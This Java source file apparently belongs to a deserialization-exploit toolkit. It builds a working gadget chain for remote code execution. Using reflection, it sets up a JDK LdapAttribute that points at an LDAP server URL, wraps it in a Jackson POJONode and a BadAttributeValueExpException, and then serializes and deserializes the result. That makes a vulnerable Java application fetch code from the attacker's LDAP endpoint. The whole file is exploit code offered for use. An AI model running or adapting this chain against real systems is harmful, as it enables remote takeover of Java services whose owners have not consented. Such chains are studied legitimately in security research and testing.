package xyz.eki.marshalexp.gadget.jdk;

import com.fasterxml.jackson.databind.node.POJONode;
import xyz.eki.marshalexp.gadget.jackson.GJackson;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import java.lang.reflect.Constructor;

public class GLdapAttribute {
    public static Object getter2RCE(String ldapServerURL) throws Exception {
        String ldapCtxUrl = ldapServerURL;
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});

        ReflectUtils.setFieldValue(ldapAttribute,"baseCtxURL", ldapCtxUrl);
        ReflectUtils.setFieldValue(ldapAttribute,"rdn", new CompositeName("a//b"));

        return ldapAttribute;
    }

    public static void main(String[] args) throws Exception {
        Object o = getter2RCE("ldap://127.0.0.1:1389/");
        POJONode jsonNodes = GJackson.toString2Getter(o);
        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonNodes);
        byte[] serialize = SerializeUtils.serialize(bd);
        SerializeUtils.deserialize(serialize);
    }
}
